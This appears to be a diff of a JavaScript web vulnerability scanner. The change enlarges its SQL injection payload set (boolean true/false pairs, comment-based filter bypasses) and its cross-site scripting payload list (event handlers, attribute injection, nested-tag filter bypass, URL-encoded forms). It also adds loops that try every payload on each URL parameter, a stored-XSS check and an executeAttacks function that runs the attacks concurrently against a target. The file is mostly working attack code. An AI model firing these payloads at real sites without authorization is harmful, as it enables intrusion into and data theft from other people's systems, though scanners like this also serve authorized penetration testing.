@@ -21,11 +21,27 @@ const extractParams = (url) => {
 const runSQLi = async (target, links = []) => {
 
     const payloadPairs = [
-        {
-            truePayload: "' OR 1=1 --",
-            falsePayload: "' AND 1=2 --"
-        }
-    ];
+    {
+        truePayload: "' OR 1=1 --",
+        falsePayload: "' AND 1=2 --"
+    },
+    {
+        truePayload: "' OR '1'='1",
+        falsePayload: "' AND '1'='2"
+    },
+    {
+        truePayload: "\" OR \"1\"=\"1",
+        falsePayload: "\" AND \"1\"=\"2"
+    },
+    {
+        truePayload: "'/**/OR/**/1=1--",
+        falsePayload: "'/**/AND/**/1=2--"
+    },
+    {
+        truePayload: "' OR 1=1#",
+        falsePayload: "' AND 1=2#"
+    }
+];
 
     let paths = [];
 
@@ -109,7 +125,26 @@ const runSQLi = async (target, links = []) => {
 // ----------------------
 const runXSS = async (target, links = []) => {
 
-    const payload = `<script>alert(1)</script>`;
+    const payloads = [
+    "<script>alert(1)</script>",
+    "\"><script>alert(1)</script>",
+    "'><script>alert(1)</script>",
+
+    // event-based
+    "<img src=x onerror=alert(1)>",
+    "<svg/onload=alert(1)>",
+
+    // filter bypass
+    "<scr<script>ipt>alert(1)</scr</script>ipt>",
+    "<img src=x onerror=confirm(1)>",
+
+    // attribute injection
+    "\" onmouseover=alert(1) x=\"",
+    "' onmouseover=alert(1) x='",
+
+    // encoded
+    "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+];
 
     let paths = [];
 
@@ -122,7 +157,11 @@ const runXSS = async (target, links = []) => {
     paths = [...new Set(paths)];
 
     if (paths.length === 0) {
-        paths = [`http://${target}/?q=`];
+        return {
+            type: "xss",
+            vulnerable: false,
+            target
+        };
     }
 
     for (let path of paths) {
@@ -135,41 +174,102 @@ const runXSS = async (target, links = []) => {
 
         const params = extractParams(baseUrl);
 
-        if (params.length === 0) continue;
-
         for (let param of params) {
 
-            let testUrl = new URL(baseUrl);
+            // ✅ THIS IS THE IMPORTANT PART (payload loop)
+            for (let payload of payloads) {
 
-            testUrl.searchParams.set(param.key, payload);
+                let testUrl = new URL(baseUrl);
 
-            const url = testUrl.toString();
+                testUrl.searchParams.set(param.key, payload);
 
-            console.log(`🧪 XSS Testing [${param.key}]:`, url);
+                const url = testUrl.toString();
 
-            try {
-                const res = await axios.get(url, {
-                    timeout: 10000,
-                    validateStatus: () => true
-                });
+                console.log(`🧪 XSS Testing [${param.key}]:`, url);
 
-                const body = res.data.toString();
+                // ----------------------
+                // STORED XSS CHECK
+                // ----------------------
+                const MAX_VERIFY = 5;
+                for (let verifyLink of links.slice(0,MAX_VERIFY)) {
 
-                // ✅ SIMPLE REFLECTION CHECK
-                if (body.includes(payload)) {
-                    return {
-                        type: "xss",
-                        vulnerable: true,
-                        technique: "reflected",
-                        payload,
-                        param: param.key,
-                        url,
-                        target
-                    };
+                    try {
+                        const verifyRes = await axios.get(verifyLink, {
+                            timeout: 10000,
+                            validateStatus: () => true
+                        });
+
+                        const verifyBody = verifyRes.data.toString().toLowerCase();
+
+                        if (verifyBody.includes(payload.toLowerCase())) {
+                            return {
+                                type: "xss",
+                                vulnerable: true,
+                                payload,
+                                param: param.key,
+                                context: "stored",
+                                target
+                            };
+                        }
+
+                    } catch {
+                        continue;
+                    }
                 }
 
-            } catch (err) {
-                continue;
+                try {
+                    const res = await axios.get(url, {
+                        timeout: 10000,
+                        validateStatus: () => true
+                    });
+                    const body = res.data.toString();
+                    const normalizedBody = body.toLowerCase();
+                    const lowerPayload = payload.toLowerCase();
+
+                    const isRaw = normalizedBody.includes(lowerPayload);
+                    const isEscaped =
+                        normalizedBody.includes(payload.replace(/</g, "&lt;").toLowerCase()) ||
+                        normalizedBody.includes(payload.replace(/>/g, "&gt;").toLowerCase());
+
+                    // 🧠 CONTEXT DETECTION
+                    let context = null;
+
+                    if (isRaw) {
+
+                        if (normalizedBody.includes(`<script`) && normalizedBody.includes(lowerPayload)) {
+                            context = "script";
+                        }
+
+                        else if (
+                            normalizedBody.includes(`="${lowerPayload}`) ||
+                            normalizedBody.includes(`='${lowerPayload}`)
+                        ) {
+                            context = "attribute";
+                        }
+
+                        else if (normalizedBody.includes(lowerPayload)) {
+                            context = "html";
+                        }
+
+                        else {
+                            context = "unknown";
+                        }
+                    }
+                
+
+                    if (isRaw ) {
+                        return {
+                            type: "xss",
+                            vulnerable: true,
+                            payload,
+                            param: param.key,
+                            context: context || "unknown",
+                            target
+                        };
+                    }
+                }                 catch (err) {
+                    continue;
+                }
             }
         }
     }
@@ -180,22 +280,25 @@ const runXSS = async (target, links = []) => {
         target
     };
 };
-
+                    
 // ----------------------
 // MAIN EXECUTOR
 // ----------------------
 const executeAttacks = async (actions, target, links = []) => {
-    const results = [];
+
+    const promises = [];
 
     for (let act of actions) {
         if (act.type === "sqli") {
-            results.push(await runSQLi(target, links));
+            promises.push(runSQLi(target, links));
         }
 
         if (act.type === "xss") {
-            results.push(await runXSS(target, links));
+            promises.push(runXSS(target, links));
         }
     }
+
+    const results = await Promise.all(promises);
 
     return results;
 };
